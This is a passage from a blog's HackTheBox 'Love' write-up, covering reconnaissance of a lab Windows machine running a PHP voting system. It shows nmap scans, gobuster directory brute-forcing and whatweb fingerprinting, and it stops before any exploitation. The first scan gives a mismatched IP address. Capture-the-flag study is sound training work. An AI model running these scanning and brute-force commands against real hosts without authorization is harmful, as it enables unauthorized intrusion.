<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="LOVE (Windows) Writeup Reconnaissance Doing a initial nmap scan revealed following result.
nmap -A -oA nmap/initial 10.10.10.242 -vvv Got the following Open Ports.
PORT 80 : running HTTP (Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)) PORT 135 : running MSRPC (Microsoft Windows RPC) PORT 139 : running netbios-ssn (Microsoft Windows netbios-ssn) PORT 443 : running ssl/http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)) PORT 445 : running microsoft-ds (Windows 10 Pro 19042 microsoft-ds) PORT 3306 : running MYSQL (MariaDB server) PORT 5000 : running http (Apache httpd 2." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://an0nud4y.com/writeups/htb-love/" />


    <title>
        
            HackTheBox: Love :: An0nud4y 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css">




    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">


<meta itemprop="name" content="HackTheBox: Love">
<meta itemprop="description" content="LOVE (Windows) Writeup Reconnaissance Doing a initial nmap scan revealed following result.
nmap -A -oA nmap/initial 10.10.10.242 -vvv Got the following Open Ports.
PORT 80 : running HTTP (Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)) PORT 135 : running MSRPC (Microsoft Windows RPC) PORT 139 : running netbios-ssn (Microsoft Windows netbios-ssn) PORT 443 : running ssl/http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)) PORT 445 : running microsoft-ds (Windows 10 Pro 19042 microsoft-ds) PORT 3306 : running MYSQL (MariaDB server) PORT 5000 : running http (Apache httpd 2."><meta itemprop="datePublished" content="2022-06-20T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-06-20T00:00:00+00:00" />
<meta itemprop="wordCount" content="2568">
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HackTheBox: Love"/>
<meta name="twitter:description" content="LOVE (Windows) Writeup Reconnaissance Doing a initial nmap scan revealed following result.
nmap -A -oA nmap/initial 10.10.10.242 -vvv Got the following Open Ports.
PORT 80 : running HTTP (Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)) PORT 135 : running MSRPC (Microsoft Windows RPC) PORT 139 : running netbios-ssn (Microsoft Windows netbios-ssn) PORT 443 : running ssl/http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)) PORT 445 : running microsoft-ds (Windows 10 Pro 19042 microsoft-ds) PORT 3306 : running MYSQL (MariaDB server) PORT 5000 : running http (Apache httpd 2."/>



    <meta property="og:title" content="HackTheBox: Love" />
<meta property="og:description" content="LOVE (Windows) Writeup Reconnaissance Doing a initial nmap scan revealed following result.
nmap -A -oA nmap/initial 10.10.10.242 -vvv Got the following Open Ports.
PORT 80 : running HTTP (Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)) PORT 135 : running MSRPC (Microsoft Windows RPC) PORT 139 : running netbios-ssn (Microsoft Windows netbios-ssn) PORT 443 : running ssl/http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)) PORT 445 : running microsoft-ds (Windows 10 Pro 19042 microsoft-ds) PORT 3306 : running MYSQL (MariaDB server) PORT 5000 : running http (Apache httpd 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://an0nud4y.com/writeups/htb-love/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-06-20T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-06-20T00:00:00+00:00" /><meta property="og:site_name" content="An0nud4y" />







    <meta property="article:published_time" content="2022-06-20 00:00:00 &#43;0000 UTC" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">S3cur!ty_Bl0g</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://an0nud4y.com/about">About</a></li><li><a href="https://an0nud4y.com/notes">Notes</a></li><li><a href="https://an0nud4y.com/resume">Resume</a></li><li><a href="https://an0nud4y.com/talks">Talks</a></li><li><a href="https://an0nud4y.com/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://an0nud4y.com/writeups/htb-love/">HackTheBox: Love</a></h2>

            

            

            <div class="post-content">
                <h1 id="love-windows-writeup">LOVE (Windows) Writeup</h1>
<p><img src="/assets/love.png" alt=""></p>
<hr>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>Doing a initial nmap scan revealed following result.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -A -oA nmap/initial 10.10.10.242 -vvv
</span></span></code></pre></div><p>Got the following Open Ports.</p>
<ul>
<li><strong>PORT 80</strong> : running HTTP (Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27))</li>
<li><strong>PORT 135</strong> : running MSRPC (Microsoft Windows RPC)</li>
<li><strong>PORT 139</strong> : running netbios-ssn (Microsoft Windows netbios-ssn)</li>
<li><strong>PORT 443</strong> : running ssl/http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27))</li>
<li><strong>PORT 445</strong> : running  microsoft-ds (Windows 10 Pro 19042 microsoft-ds)</li>
<li><strong>PORT 3306</strong> : running MYSQL (MariaDB server)</li>
<li><strong>PORT 5000</strong> : running http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27))</li>
</ul>
<p>From ssl-cert we also found a hostname <code>staging.love.htb</code> , Let&rsquo;s add the hostname to etc/hosts file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.10.10.239 staging.love.htb love.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─# nmap -A -oA nmap/initial 10.10.10.239                                           <span style="color:#ae81ff">130</span> ⨯
</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-04-14 06:06 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.239
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.37s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">993</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE      VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http         Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Voting System using PHP
</span></span><span style="display:flex;"><span>| http-cookie-flags: 
</span></span><span style="display:flex;"><span>|   /: 
</span></span><span style="display:flex;"><span>|     PHPSESSID: 
</span></span><span style="display:flex;"><span>|_      httponly flag not set
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>443/tcp  open  ssl/http     Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in
</span></span><span style="display:flex;"><span>| Not valid before: 2021-01-18T14:00:16
</span></span><span style="display:flex;"><span>|_Not valid after:  2022-01-18T14:00:16
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3306/tcp open  mysql?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   HTTPOptions, LANDesk-RC, TLSSessionReq: 
</span></span><span style="display:flex;"><span>|_    Host <span style="color:#e6db74">&#39;10.10.14.18&#39;</span> is not allowed to connect to this MariaDB server
</span></span><span style="display:flex;"><span>5000/tcp open  http         Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port3306-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/14%Time<span style="color:#f92672">=</span>6257F239%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>HT
</span></span><span style="display:flex;"><span>SF:TPOptions,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.18&#39;\x20is\x20not\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSe
</span></span><span style="display:flex;"><span>SF:ssionReq,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.18&#39;\x20is\x20not\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDes
</span></span><span style="display:flex;"><span>SF:k-RC,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.18&#39;\x20is\x20not\x20all
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1709</span> - <span style="color:#ae81ff">1909</span> <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Microsoft Windows Longhorn <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1709</span> - <span style="color:#ae81ff">1803</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1809</span> - <span style="color:#ae81ff">1909</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1511</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1703</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> SP2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3.1.1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| smb-security-mode: 
</span></span><span style="display:flex;"><span>|   account_used: &lt;blank&gt;
</span></span><span style="display:flex;"><span>|   authentication_level: user
</span></span><span style="display:flex;"><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2022-04-14T10:36:29
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb-os-discovery: 
</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">10</span> Pro 6.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_10::-
</span></span><span style="display:flex;"><span>|   Computer name: Love
</span></span><span style="display:flex;"><span>|   NetBIOS computer name: LOVE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|_  System time: 2022-04-14T03:36:27-07:00
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 2h48m59s, deviation: 4h02m31s, median: 28m57s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 22/tcp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   340.24 ms 10.10.14.1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   340.47 ms 10.10.10.239
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 87.43 seconds
</span></span></code></pre></div><ul>
<li><strong>PORT 80</strong> : running HTTP (Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27))</li>
<li><strong>PORT 135</strong> : running MSRPC (Microsoft Windows RPC)</li>
<li><strong>PORT 139</strong> : running netbios-ssn (Microsoft Windows netbios-ssn)</li>
<li><strong>PORT 443</strong> : running ssl/http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27))</li>
<li><strong>PORT 445</strong> : running  microsoft-ds (Windows 10 Pro 19042 microsoft-ds)</li>
<li><strong>PORT 3306</strong> : running MYSQL (MariaDB server)</li>
<li><strong>PORT 5000</strong> : running http (Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27))</li>
</ul>
<hr>
<h1 id="reconnaissance-1">Reconnaissance</h1>
<p>So there are 7 ports open and running multiple services, Let&rsquo;s differentiate them and let&rsquo;s attack the Ports which have large attack surface first.</p>
<p>Port 80,443,5000 are running web services, So they may have large attack surface.
Port 135,139,445,3306 running different services and possibly may be useful during recon.</p>
<h3 id="port-80---http--apache-httpd-2446">Port 80 - HTTP  (Apache httpd 2.4.46)</h3>
<p>Website is running some Voting System Login Portal.</p>
<p><img src="/assets/Pasted%20image%2020220415021509.png" alt="assets/Pasted image 20220415021509.png"></p>
<p>There is nothing interesting in the page, But we can try few attacks on the website.
Let&rsquo;s first bruteforce the directories using gobuster.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.10.239/ -t <span style="color:#ae81ff">100</span> -x php,html,jpg,txt --no-tls-validation
</span></span></code></pre></div><p>We found an interesting directory /admin</p>
<p><img src="/assets/Pasted%20image%2020220415022037.png" alt="assets/Pasted image 20220415022037.png"></p>
<p>We found a admin login panel,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://10.10.10.239/admin
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220415022329.png" alt="assets/Pasted image 20220415022329.png"></p>
<p>Let&rsquo;s run whatweb against the url to figure out the posssible technologies website is using.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>whatweb http://10.10.10.239
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─# whatweb http://10.10.10.239
</span></span><span style="display:flex;"><span>http://10.10.10.239 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.46<span style="color:#f92672">]</span>, Bootstrap, Cookies<span style="color:#f92672">[</span>PHPSESSID<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.10.239<span style="color:#f92672">]</span>, JQuery, OpenSSL<span style="color:#f92672">[</span>1.1.1j<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>7.3.27<span style="color:#f92672">]</span>, PasswordField<span style="color:#f92672">[</span>password<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Voting System using PHP<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/7.3.27<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>So the website is running Voting system using PHP version 7.3.27 , Also the backend server is a Windows 64 Bit Machine. We found same info about machine Operating system during nmap scan (Windows 10 Pro 19042 (Windows 10 Pro 6.3))</p>
<p>Tried bruteforcing the /admin directory but found nothing inetersting other than some php files,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.10.239/admin/ -t <span style="color:#ae81ff">50</span> -x php,html,jpg,txt --no-tls-validation -q
</span></span><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/home.php             <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16257<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6198<span style="color:#f92672">]</span>                 
</span></span><span style="display:flex;"><span>/print.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 397<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>  
</span></span><span style="display:flex;"><span>/Home.php             <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16257<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 346<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/admin/includes/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/Index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6198<span style="color:#f92672">]</span>                                         
</span></span><span style="display:flex;"><span>/Login.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                            
</span></span><span style="display:flex;"><span>/logout.php           <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                            
</span></span><span style="display:flex;"><span>/%20                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/INDEX.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6198<span style="color:#f92672">]</span>                                         
</span></span><span style="display:flex;"><span>/positions.php        <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 19800<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                        
</span></span><span style="display:flex;"><span>/Print.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 397<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                          
</span></span><span style="display:flex;"><span>/*checkout*           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*checkout*.html      <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*checkout*.jpg       <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*checkout*.txt       <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*checkout*.php       <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/HOME.php             <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16257<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                        
</span></span><span style="display:flex;"><span>/votes.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 15516<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                        
</span></span><span style="display:flex;"><span>/candidates.php       <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 29783<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                        
</span></span><span style="display:flex;"><span>/Logout.php           <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; index.php<span style="color:#f92672">]</span>                            
</span></span><span style="display:flex;"><span>/*docroot*            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*docroot*.php        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*docroot*.html       <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*docroot*.jpg        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*docroot*.txt        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*                    <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*.php                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*.html               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*.jpg                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/*.txt                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
